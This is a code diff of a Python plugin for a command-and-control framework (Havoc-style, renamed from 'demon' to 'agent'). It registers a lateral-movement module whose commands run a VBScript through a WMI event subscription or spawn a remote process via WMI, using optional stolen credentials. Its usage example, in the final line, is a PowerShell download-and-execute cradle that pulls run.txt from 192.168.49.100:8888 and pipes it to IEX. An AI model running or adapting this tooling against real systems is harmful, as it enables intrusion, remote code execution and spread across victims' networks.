@@ -1,14 +1,14 @@
-from havoc import Demon, RegisterCommand, RegisterModule
+from vaelix_host import Agent, RegisterCommand, RegisterModule
 import re
 
-def wmi_eventsub( demonID, *params ):
+def wmi_eventsub( agentID, *params ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer = Packer()
-    demon  = Demon( demonID )
+    agent  = Agent( agentID )
 
-    if demon.ProcessArch == 'x86':
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+    if agent.ProcessArch == 'x86':
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
     num_params = len(params)
@@ -20,11 +20,11 @@ def wmi_eventsub( demonID, *params ):
     is_current = True
 
     if num_params < 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
         return False
 
     if num_params > 5:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
         return False
 
     target = f'\\\\{params[ 0 ]}\\ROOT\\SUBSCRIPTION'
@@ -33,11 +33,11 @@ def wmi_eventsub( demonID, *params ):
         with open(params[ 1 ], 'r') as f:
             vbscript = f.read()
     except Exception as e:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid vbscript path" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Invalid vbscript path" )
         return False
 
     if num_params > 2 and num_params < 5:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
         return False
 
     if num_params == 5:
@@ -53,20 +53,20 @@ def wmi_eventsub( demonID, *params ):
     packer.addWstr(vbscript)
     packer.addbool(is_current)
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run a VBS script in {target} via wmi" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to run a VBS script in {target} via wmi" )
 
-    demon.InlineExecute( TaskID, "go", f"EventSub/bin/EventSub.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"EventSub/bin/EventSub.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def wmi_proccreate( demonID, *params ):
+def wmi_proccreate( agentID, *params ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer = Packer()
-    demon  = Demon( demonID )
+    agent  = Agent( agentID )
 
-    if demon.ProcessArch == 'x86':
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+    if agent.ProcessArch == 'x86':
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
     num_params = len(params)
@@ -79,18 +79,18 @@ def wmi_proccreate( demonID, *params ):
     is_current = True
 
     if num_params < 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
         return False
 
     if num_params > 5:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
         return False
 
     target  = f'\\\\{params[ 0 ]}\\ROOT\\CIMV2'
     command = params[ 1 ]
 
     if num_params > 2 and num_params < 5:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
         return False
 
     if num_params == 6:
@@ -106,12 +106,12 @@ def wmi_proccreate( demonID, *params ):
     packer.addWstr(command)
     packer.addbool(is_current)
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run command on {target} via wmi" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to run command on {target} via wmi" )
 
-    demon.InlineExecute( TaskID, "go", f"ProcCreate/bin/ProcCreate.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"ProcCreate/bin/ProcCreate.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
 RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
-RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/demon.vba" )
+RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/agent.vba" )
 RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
